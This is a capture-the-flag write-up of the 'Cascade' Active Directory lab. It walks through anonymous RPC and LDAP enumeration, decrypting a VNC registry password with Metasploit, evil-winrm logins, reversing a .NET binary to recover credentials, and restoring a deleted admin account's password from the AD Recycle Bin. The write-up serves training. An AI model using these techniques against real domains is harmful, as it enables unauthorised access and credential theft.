## Overview
Enumerate possible user accounts and poke at LDAP to find a base64 encoded password that sticks out. With those credentials, you can log in to an SMB user and find a registry file that contains a set of credentials encoded in hex. These credentials will then give us access to a .NET application that we can reverse to find out how passwords are being decrypted for a database. This will give us access to Active Directory via remote login which we can "dumpster dive" and find credentials for an Administrator account.

## Recon
As always, Nmap the box to find open ports which we can enumerate further. The following ports were open:
```

```
Just by seeing DNS (port 53), SMB (port 139) and ldap (port 389) I can tell we are dealing with Active Directory.
The LDAP banner confirms it as well as giving us the domain name 'cascade.local'. <br>
Quick tip: if you take a look at the hostname 'CASC-DC1', DC usually stands for domain controller which is a massive hint that it is an Active Directory.
## Enumeration
### RPC
First things first, let’s try leak some usernames since port 5985 is open which is typically for remote login. There are several ways to enumerate usernames but the quickest is to log in anonymously with rpcclient by specifying an empty username/password and using the ‘enumdomusers’ command:

{% highlight bash %}
root@crab:~# rpcclient 10.10.10.182 -U ''
Enter password: 
rpcclient $> enumdomusers
user:[CascGuest] rid:[0x1f5]
user:[arksvc] rid:[0x452]
user:[s.smith] rid:[0x453]
user:[r.thompson] rid:[0x455]
user:[util] rid:[0x457]
user:[j.wakefield] rid:[0x45c]
user:[s.hickson] rid:[0x461]
user:[j.goodhand] rid:[0x462]
user:[a.turnbull] rid:[0x464]
user:[e.crowe] rid:[0x467]
user:[b.hanson] rid:[0x468]
user:[d.burman] rid:[0x469]
user:[BackupSvc] rid:[0x46a]
user:[j.allen] rid:[0x46e]
user:[i.croft] rid:[0x46f]
{% endhighlight %}

You can use the magical sed and awk commands to keep just the usernames or do it manually (if you do it manually I respect your dedication).
Here is a command that will make your life a breeze:

{% highlight bash %}
root@crab:~# cat temp.txt | awk -F\[ {'print $2'} | awk -F\] {'print $1'} > users.txt
root@crab:~# cat users.txt
CascGuest
arksvc
s.smith
r.thompson
util
j.wakefield
s.hickson
j.goodhand
a.turnbull
e.crowe
b.hanson
d.burman
BackupSvc
j.allen
i.croft
{% endhighlight %}

### LDAP
We have usernames now but we still possible password which can be found using ldapsearch. Let’s start by dumping everything into a file using anonymous LDAP login and go on from there.

{% highlight bash %}
root@crab:~# ldapsearch -x -h 10.10.10.182 -b dc=cascade,dc=local > ldap/anonymous.ldap
{% endhighlight %}

Using grep on a file rather than calling ldapsearch each time is probably the best idea; in this case, I printed out the file that contained the output of ldap and used grep to filter out anything that was unique. <br> 
Sifting through the output, “cascadeLegacyPwd: clk0bjVldmE=” stands out and decoding the base64 gives us a potential password:

{% highlight bash %}
root@crab:~# cat ldap/anonymous.ldap | sort | uniq -c
...
   1  cade.local                                                                                                                      
      3 cal                                                                                                                             
      1 =cascade,DC=local                                                                                                               
      3 cascade,DC=local                                                                                                                
      1 cascadeLegacyPwd: clk0bjVldmE=                                                                                                   
      3 cascade.local                                                                                                                  
      1 # cascade.local                                                                                                                  
      1 # CASC-DC1, Domain Controllers, cascade.local  
...

Let’s go ahead and access the Data share with r.thompson’s credentials and further enumerate. <br>
There is an interesting registry file under the /IT/Temp/s.smith directory in the ‘Date’ share. Lets retrieve it for examination.

```
root@crab:~# smbclient \\\\10.10.10.182\\Data -U r.thompson -p
Enter r.thompson password:

  VNC Install.reg                     A     2680  Tue Jan 28 14:27:44 2020

smb: \IT\Temp\s.smith\> get "VNC Install.reg"
getting file \IT\Temp\s.smith\VNC Install.reg of size 2680 as VNC Install.reg (6.1 KiloBytes/sec) (average 6.1 KiloBytes/sec)
```

Reading the file reveals a possible password encoded in hex as well as other configuration settings.

{% highlight bash %}
root@crab:~# cat "VNC Install.reg"
...
"UseMirrorDriver"=dword:00000001
"EnableUrlParams"=dword:00000001
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
"AlwaysShared"=dword:00000000
"NeverShared"=dword:00000000
...
{% endhighlight %}
Decoding the hex gives us junk characters so it might not be in plain text. A quick Google search for a way to decode VNC type hex reveals that we can use msfconsole to decode it into plain text by giving it a fixed key:
```
root@crab:~# msfconsole
msf5 > irb
[*] Starting IRB shell...
[*] You are in the "framework" object

>> fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
>> require 'rex/proto/rfb'
=> true
>>  Rex::Proto::RFB::Cipher.decrypt ["6bcf2a4b6e5aca0f"].pack('H*'), fixedkey
=> "sT333ve2"
```

Just like that, we have s.smith’s password!
# Gaining access
## s.smith
Now that we have s.smith’s credentials, we can try login with evil-winrm and pray s.smith is in the Remote Management group.

```
root@crab:~# evil-winrm -i 10.10.10.182 -u s.smith -p sT333ve2

```

Nice, we got the user flag :) <br>
If you noticed from before, the SMB Audit share was not readable by r.thompson but now with s.smith we are able to access it.

```

Those are some juicy files that we can try reverse engineer. Let’s break it down piece by piece since reverse-engineering gets messy pretty fast.
We have 4 files that are interesting:
<ul>
        <li><b>CascAudit.exe:</b> Main executable</li>
        <li><b>CascCrypto.dll:</b> Encrypts and Decrypts</li>
        <li><b>RunAudit.bat:</b> Gives us the correct arugument to run the the executable (the Audit database file)</li>
        <li><b>Audit.db:</b> Database containing the users</li>
</ul>
We will be using DnSpy to reverse and view the source code. The first thing that catches my eye is the password being decrypted with a key and saved into a variable: <br>
<img src="/assets/images/writeup/cascade/reverse-password-variable.png"> <br>
What if we added a breakpoint here and ran CascAudit.exe with the database file as an argument? Theoretically, we should be able to read the password at the breakpoint in plain text. <br>
<img src="/assets/images/writeup/cascade/reverse-running-argument.png"> <br>
<img src="/assets/images/writeup/cascade/reverse-reading-password-variable.png"> <br>
Another user’s credentials compromised!

{% highlight bash %}
ArkScv  :: w3lc0meFr31nd
{% endhighlight %}

## ArkScv
The ArkScv account can also be remotely logged in with evil-winrm. Upon checking what groups ArkScv is in we can see he is a part of AD Recycle Bin.

```

The command completed successfully.
```

Why is this important? Well, if you enumerated r.thompson’s SMB shares thoroughly you’d notice an E-mail talking about a TempAdmin account that was deleted.

{% highlight html %}
...
<p>-- We will be using a temporary account to
perform all tasks related to the network migration and this account will be deleted at the end of
2018 once the migration is complete. This will allow us to identify actions
related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). </p>
...
{% endhighlight %}

Taking this into consideration, we can attempt to recover the deleted account password and log in as Administrator. <br>
We can query deleted objects and filter out everything except users by using the following powershell command:

{% highlight bash %}
Get-ADObject -SearchBase “DC=cascade,DC=local” -Filter {ObjectClass -eq "user"} -IncludeDeletedObjects -Properties *

...

Just like before ‘cascadeLegacyPwd’ has a base64 encoded password, but this time once decoded we can log in to Administrator and grab the root flag!

```

# Conclusion
Despite being a super frustrating box, I loved it due to its unique approach of pure enumeration and no CVE related exploitation.
